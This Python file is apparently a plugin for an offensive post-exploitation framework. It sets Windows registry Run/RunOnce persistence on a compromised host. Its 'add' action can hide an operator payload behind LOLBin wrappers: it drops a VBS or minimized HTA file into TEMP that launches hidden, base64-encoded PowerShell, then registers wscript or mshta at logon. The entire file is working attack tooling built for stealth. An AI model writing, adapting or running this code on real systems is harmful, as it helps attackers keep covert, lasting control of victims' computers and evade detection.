"""persistence/registry_run — HKCU/HKLM Run key persistence with LOLBin wrappers. MITRE T1547.001"""
import base64
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class RegistryRun(BasePlugin):
    NAME        = "registry_run"
    DESCRIPTION = "Run/RunOnce key persistence. Supports HKCU/HKLM, LOLBin wrappers, list, add, remove actions."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1547.001"
    CATEGORY    = "persistence"
    schema      = ParamSchema().add(
        Param("action",  str,  required=False, default="add",
              help="Action: add | remove | list"),
        Param("name",    str,  required=False, default="",
              help="Registry value name (required for add/remove)"),
        Param("payload", str,  required=False, default="",
              help="Command to run on logon (required for add)"),
        Param("hive",    str,  required=False, default="hkcu",
              help="Registry hive: hkcu | hklm (hklm requires admin)"),
        Param("key",     str,  required=False, default="Run",
              help="Key: Run | RunOnce"),
        Param("lolbin",  str,  required=False, default="none",
              help="LOLBin wrapper: none | wscript | mshta | regsvr32"),
    )

    @mitre("T1547.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        action  = params.get("action",  "add").lower()
        name    = params.get("name",    "")
        payload = params.get("payload", "")
        hive    = params.get("hive",    "hkcu").lower()
        key_sub = params.get("key",     "Run")
        lolbin  = params.get("lolbin",  "none").lower()

        hive_path = (
            "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\"
            if hive == "hkcu" else
            "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\"
        )
        reg_key = hive_path + key_sub

        if action == "list":
            ps = (
                f"$keys=@('{hive_path}Run', '{hive_path}RunOnce');"
                "foreach($k in $keys){"
                "  Write-Output \"=== $k ===\";"
                "  Get-ItemProperty $k -EA SilentlyContinue"
                "  |Select-Object -Property * -ExcludeProperty PS*"
                "  |Format-List"
                "}"
            )

        elif action == "remove":
            if not name:
                return ModuleResult.err("name is required for remove")
            ps = (
                f"Remove-ItemProperty -Path '{reg_key}' -Name '{name}' -EA SilentlyContinue;"
                f"Write-Output '[+] Removed: {name} from {reg_key}'"
            )

        else:  # add
            if not name or not payload:
                return ModuleResult.err("name and payload are required for add")

            # Wrap payload in LOLBin if requested
            if lolbin == "wscript":
                # Write a VBS dropper to TEMP, point Run key at wscript
                enc = base64.b64encode(payload.encode("utf-16-le")).decode("ascii")
                vbs_path = f"%TEMP%\\{name}.vbs"
                vbs_body = (
                    f"Set o=CreateObject(\"WScript.Shell\"):"
                    f"o.Run \"powershell -nop -w hidden -EncodedCommand {enc}\",0,False"
                )
                launch_cmd = f"wscript.exe \"{vbs_path}\""
                ps = (
                    f"$vbs_path=[System.Environment]::ExpandEnvironmentVariables('{vbs_path}');"
                    f"Set-Content -Path $vbs_path -Value '{vbs_body}';"
                    f"Set-ItemProperty -Path '{reg_key}' -Name '{name}' -Value '{launch_cmd}';"
                    f"Write-Output '[+] Registry Run key set (wscript wrapper): {name}';"
                    f"Write-Output '    VBS: ' + $vbs_path;"
                    f"Write-Output '    Cmd: {launch_cmd}'"
                )
            elif lolbin == "mshta":
                enc = base64.b64encode(payload.encode("utf-16-le")).decode("ascii")
                hta_content = (
                    "<html><head><HTA:APPLICATION WINDOWSTATE='minimize' SHOWINTASKBAR='no'/>"
                    "<script language='VBScript'>Sub Window_onLoad:"
                    f"CreateObject(\"WScript.Shell\").Run \"powershell -nop -w hidden -EncodedCommand {enc}\",0,False:"
                    "self.close:End Sub</script></head><body></body></html>"
                )
                hta_path = f"%TEMP%\\{name}.hta"
                launch_cmd = f"mshta.exe \"{hta_path}\""
                ps = (
                    f"$hp=[System.Environment]::ExpandEnvironmentVariables('{hta_path}');"
                    f"Set-Content -Path $hp -Value '{hta_content}';"
                    f"Set-ItemProperty -Path '{reg_key}' -Name '{name}' -Value '{launch_cmd}';"
                    f"Write-Output '[+] Registry Run key set (mshta wrapper): {name}';"
                    f"Write-Output '    HTA: ' + $hp;"
                    f"Write-Output '    Cmd: {launch_cmd}'"
                )
            else:  # none — direct
                safe_payload = payload.replace("'", "''")
                ps = (
                    f"Set-ItemProperty -Path '{reg_key}' -Name '{name}' -Value '{safe_payload}';"
                    f"$v=(Get-ItemProperty '{reg_key}' -Name '{name}').'{name}';"
                    f"Write-Output '[+] Registry Run key set: {name}';"
                    f"Write-Output \"    Key: {reg_key}\";"
                    "Write-Output \"    Value: $v\""
                )

        r = ctx.ps(ps)
        if r["status"] not in ("ok", "error"):
            return ModuleResult.err("Dispatch failed")
        return ModuleResult.ok(data=r["output"])
